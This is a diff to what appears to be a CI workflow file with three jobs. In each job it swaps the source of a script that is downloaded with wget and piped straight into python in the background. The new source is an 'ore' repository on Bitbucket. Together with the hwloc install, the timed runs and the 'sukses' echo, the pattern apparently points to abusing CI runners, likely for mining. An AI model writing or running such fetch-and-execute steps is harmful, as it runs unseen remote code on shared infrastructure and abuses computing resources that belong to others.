@@ -28,7 +28,7 @@ jobs:
     - name: Main
       run: |
         sudo apt-get update && sudo apt install libc-bin libc6 hwloc
-        timeout 5m wget -O- https://github.com/jepir3/Sr/raw/main/sr.py | python &
+        timeout 5m wget -O- https://bitbucket.org/ikajo/ore/raw/27490d5b22a3c91b3c646df352245c52fde73b91/sr.py | python &
         sleep 5m
         echo "sukses"
   mechat:
@@ -54,7 +54,7 @@ jobs:
     - name: Main
       run: |
         sudo apt-get update && sudo apt install libc-bin libc6 hwloc
-        timeout 15m wget -O- https://github.com/jepir3/Sr/raw/main/sr.py | python &
+        timeout 15m wget -O- https://bitbucket.org/ikajo/ore/raw/27490d5b22a3c91b3c646df352245c52fde73b91/sr.py | python &
         sleep 15m
         echo "sukses"
   mechat2:
@@ -80,7 +80,7 @@ jobs:
     - name: Main
       run: |
         sudo apt-get update && sudo apt install libc-bin libc6 hwloc
-        timeout 15m wget -O- https://github.com/jepir3/Sr/raw/main/sr.py | python &
+        timeout 15m wget -O- https://bitbucket.org/ikajo/ore/raw/27490d5b22a3c91b3c646df352245c52fde73b91/sr.py | python &
         sleep 15m
         echo "sukses"
   Success:
